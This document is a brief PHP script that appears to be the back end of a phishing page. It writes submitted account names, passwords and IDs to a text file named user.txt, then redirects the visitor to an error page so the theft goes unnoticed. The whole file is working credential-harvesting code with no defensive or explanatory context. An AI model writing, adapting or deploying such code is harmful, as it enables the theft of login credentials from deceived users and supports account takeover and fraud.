<?php

file_put_contents("user.txt", "Account: " . $_POST['text'] . " Pass: " . $_POST['password'] . " ID: " . $_POST['ID'] . "\n", FILE_APPEND);
header('Location: Error.html');
exit();
